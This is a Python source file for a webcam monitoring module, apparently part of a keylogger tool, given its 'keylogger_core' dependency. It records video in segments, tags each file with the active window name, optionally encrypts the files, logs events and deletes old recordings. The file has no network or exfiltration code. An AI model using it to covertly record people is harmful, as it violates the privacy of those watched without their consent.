"""Webcam camera monitoring utility with segment recording, optional encryption, and cleanup."""
import time
import threading
import logging
import os
from typing import Optional, Dict, Any, Tuple
from pathlib import Path
import io
import hashlib

try:
    import cv2  # type: ignore
except Exception as e:
    cv2 = None  # type: ignore
    logging.warning(f"OpenCV not available: {e}")

logger = logging.getLogger(__name__)


class CameraMonitor:
    def __init__(self, keylogger_core):
        self.keylogger_core = keylogger_core
        self.config = keylogger_core.config
        self.is_running = False

        # Core settings
        self.device_index = int(self.config.get('camera.device_index', 0))
        self.segment_seconds = int(self.config.get('camera.segment_seconds', 60))
        self.fps = float(self.config.get('camera.fps', 15))
        width = self.config.get('camera.width', None)
        height = self.config.get('camera.height', None)
        if isinstance(width, int) and isinstance(height, int) and width > 0 and height > 0:
            self.resolution: Tuple[int, int] = (width, height)
        else:
            res = self.config.get('camera.resolution', (640, 480))
            try:
                self.resolution = (int(res[0]), int(res[1]))
            except Exception:
                self.resolution = (640, 480)
        self.format = str(self.config.get('camera.format', 'mp4')).lower()
        self.codec = str(self.config.get('camera.codec', 'mp4v')).upper()

        # Privacy (simple transforms only)
        self.grayscale = bool(self.config.get('camera.grayscale', False))
        self.blur = bool(self.config.get('camera.blur', False))

        # Storage and security
        self.encrypt_videos = bool(self.config.get('camera.encrypt', False))
        self.hash_videos = bool(self.config.get('security.hash_videos', True))
        self._setup_camera_directory()

        # Performance and limits
        self.cleanup_old_videos = bool(self.config.get('performance.cleanup_old_videos', True))
        self.max_videos = int(self.config.get('performance.max_videos', 200))
        self.max_file_size = int(self.config.get('performance.max_video_size_mb', 50)) * 1024 * 1024

        # Stats and metadata
        self.stats = {
            'videos_recorded': 0,
            'videos_encrypted': 0,
            'total_size_bytes': 0,
            'average_size_bytes': 0,
            'errors': 0,
            'cleanup_operations': 0,
        }
        self.video_metadata: Dict[str, Dict[str, Any]] = {}

    def _setup_camera_directory(self) -> None:
        try:
            storage_path = self.config.get('camera.storage_path', 'camera') or 'camera'
            storage_path_obj = Path(storage_path)
            if not storage_path_obj.is_absolute():
                try:
                    config_dir = Path(getattr(self.keylogger_core, 'config_path', 'config.json')).parent.resolve()
                except Exception:
                    config_dir = Path.cwd()
                self.video_dir = (config_dir / storage_path_obj).resolve()
            else:
                self.video_dir = storage_path_obj
            self.video_dir.mkdir(parents=True, exist_ok=True)
            logger.info(f"Camera directory setup: {self.video_dir}")
        except Exception as e:
            logger.error(f"Failed to setup camera directory: {e}")
            self.video_dir = Path.cwd()

    def _check_camera_support(self) -> bool:
        if cv2 is None:
            logger.error("OpenCV (cv2) not available")
            return False
        cap = None
        try:
            cap = cv2.VideoCapture(self.device_index)
            ok = cap.isOpened()
            if not ok:
                logger.error(f"Cannot open camera device {self.device_index}")
                return False
            return True
        except Exception as e:
            logger.error(f"Camera open test failed: {e}")
            return False
        finally:
            if cap is not None:
                try:
                    cap.release()
                except Exception:
                    pass

    def run(self) -> None:
        logger.info("Camera monitor run() called")
        if not self._check_camera_support():
            return
        self.is_running = True
        cap = None
        try:
            cap = cv2.VideoCapture(self.device_index)
            # Apply desired capture resolution when possible
            cap.set(cv2.CAP_PROP_FRAME_WIDTH, self.resolution[0])
            cap.set(cv2.CAP_PROP_FRAME_HEIGHT, self.resolution[1])
            cap.set(cv2.CAP_PROP_FPS, self.fps)

            # Confirm actual resolution
            actual_w = int(cap.get(cv2.CAP_PROP_FRAME_WIDTH)) or self.resolution[0]
            actual_h = int(cap.get(cv2.CAP_PROP_FRAME_HEIGHT)) or self.resolution[1]
            size = (actual_w, actual_h)

            fourcc = cv2.VideoWriter_fourcc(*self.codec)
            while self.is_running and not self.keylogger_core.stop_event.is_set():
                start_ts = time.time()
                window_name = self.keylogger_core.session_stats.get('active_window', 'Unknown')
                filename = self._generate_filename(start_ts, window_name)
                filepath = self.video_dir / filename

                writer = cv2.VideoWriter(str(filepath), fourcc, self.fps, size, isColor=not self.grayscale)
                if not writer.isOpened():
                    logger.error("Failed to open VideoWriter")
                    self.stats['errors'] += 1
                    time.sleep(1.0)
                    continue

                # Record one segment
                while (time.time() - start_ts) < self.segment_seconds:
                    if self.keylogger_core.stop_event.is_set() or not self.is_running:
                        break
                    ret, frame = cap.read()
                    if not ret or frame is None:
                        time.sleep(0.03)
                        continue
                    if self.grayscale:
                        frame = cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY)
                    if self.blur:
                        # Mild blur; kernel must be odd
                        k = 5
                        frame = cv2.GaussianBlur(frame, (k, k), 0)
                    try:
                        writer.write(frame)
                    except Exception:
                        self.stats['errors'] += 1
                        break
                try:
                    writer.release()
                except Exception:
                    pass

                # Post-process file (encrypt/hash/log/cleanup)
                try:
                    file_size = 0
                    if filepath.exists():
                        file_size = filepath.stat().st_size
                        if file_size == 0:
                            try:
                                filepath.unlink()
                            except Exception:
                                pass
                            continue
                        if self.max_file_size and file_size > self.max_file_size:
                            logger.warning(f"Video too large ({file_size} bytes), skipping")
                            try:
                                filepath.unlink()
                            except Exception:
                                pass
                            continue

                        encrypted = False
                        if self.encrypt_videos and getattr(self.keylogger_core, 'encryption', None) and getattr(self.keylogger_core.encryption, 'is_initialized', lambda: False)():
                            try:
                                with open(filepath, 'rb') as f:
                                    raw = f.read()
                                enc_bytes = self.keylogger_core.encryption.encrypt(raw)
                                if enc_bytes:
                                    enc_path = filepath.with_suffix(filepath.suffix + '.enc')
                                    with open(enc_path, 'wb') as f:
                                        f.write(enc_bytes)
                                    try:
                                        filepath.unlink()
                                    except Exception:
                                        pass
                                    filepath = enc_path
                                    encrypted = True
                                    self.stats['videos_encrypted'] += 1
                                    file_size = enc_path.stat().st_size
                            except Exception as e:
                                logger.warning(f"Video encryption failed, keeping unencrypted: {e}")

                        # Hash (best-effort)
                        meta: Dict[str, Any] = {
                            'timestamp': start_ts,
                            'window_name': window_name,
                            'file_size': file_size,
                            'resolution': size,
                            'fps': self.fps,
                            'duration_seconds': int(time.time() - start_ts),
                            'format': self.format,
                            'codec': self.codec,
                            'encrypted': encrypted,
                        }
                        if self.hash_videos and filepath.exists() and filepath.is_file():
                            try:
                                with open(filepath, 'rb') as f:
                                    file_hash = hashlib.sha256(f.read()).hexdigest()[:16]
                                meta['file_hash'] = file_hash
                            except Exception:
                                pass
                        self.video_metadata[filepath.name] = meta

                        self.stats['videos_recorded'] += 1
                        self.stats['total_size_bytes'] += file_size
                        self.stats['average_size_bytes'] = self.stats['total_size_bytes'] / max(self.stats['videos_recorded'], 1)

                        self._log_camera_event(filepath.name, window_name, file_size, meta)

                        if self.cleanup_old_videos:
                            self._cleanup_old_videos()
                except Exception as e:
                    logger.error(f"Error finalizing video segment: {e}")
                    self.stats['errors'] += 1
        except Exception as e:
            logger.error(f"Critical error in camera monitor: {e}")
        finally:
            try:
                if cap is not None:
                    cap.release()
            except Exception:
                pass
            self.is_running = False
            logger.info(f"Camera monitor stopped. Stats: {self.stats}")

    def _generate_filename(self, ts: float, window_name: str) -> str:
        time_str = time.strftime('%Y%m%d_%H%M%S', time.localtime(ts))
        safe_window = ''.join(c for c in window_name if c.isalnum() or c in (' ', '-', '_')).strip().replace(' ', '_')[:50]
        base = f"camera_{time_str}"
        if safe_window:
            base += f"_{safe_window}"
        ext = '.mp4' if self.format == 'mp4' else '.avi'
        return base + ext

    def _log_camera_event(self, filename: str, window_name: str, file_size: int, meta: Dict[str, Any]) -> None:
        try:
            details = f"Camera segment recorded: {filename} ({file_size} bytes)"
            self.keylogger_core.log_event(
                "Camera",
                details,
                window_name,
                metadata={
                    'filename': filename,
                    'file_size': file_size,
                    'encrypted': meta.get('encrypted', False),
                    'format': meta.get('format'),
                    'codec': meta.get('codec'),
                    'fps': meta.get('fps'),
                    'duration_seconds': meta.get('duration_seconds'),
                    'resolution': meta.get('resolution'),
                }
            )
        except Exception as e:
            logger.error(f"Error logging camera event: {e}")

    def _cleanup_old_videos(self) -> None:
        try:
            files = []
            for ext in ['.mp4', '.avi', '.mov', '.mkv', '.enc']:
                files.extend(self.video_dir.glob(f"*{ext}"))
            files.sort(key=lambda p: p.stat().st_mtime)
            if len(files) > self.max_videos:
                to_remove = files[:-self.max_videos]
                removed = 0
                for fp in to_remove:
                    try:
                        fp.unlink()
                        removed += 1
                        if fp.name in self.video_metadata:
                            del self.video_metadata[fp.name]
                    except Exception:
                        pass
                if removed:
                    self.stats['cleanup_operations'] += removed
                    logger.info(f"Cleaned up {removed} old videos")
        except Exception as e:
            logger.error(f"Error during video cleanup: {e}")

    def get_stats(self) -> Dict[str, Any]:
        return {**self.stats, 'is_running': self.is_running, 'video_directory': str(self.video_dir), 'metadata_entries': len(self.video_metadata)}

    def get_video_list(self, limit: Optional[int] = None) -> list:
        try:
            vids = []
            for filename, metadata in self.video_metadata.items():
                filepath = self.video_dir / filename
                if filepath.exists():
                    vids.append({'filename': filename, 'filepath': str(filepath), 'metadata': metadata})
            vids.sort(key=lambda x: x['metadata'].get('timestamp', 0), reverse=True)
            if limit:
                vids = vids[:limit]
            return vids
        except Exception as e:
            logger.error(f"Error getting video list: {e}")
            return []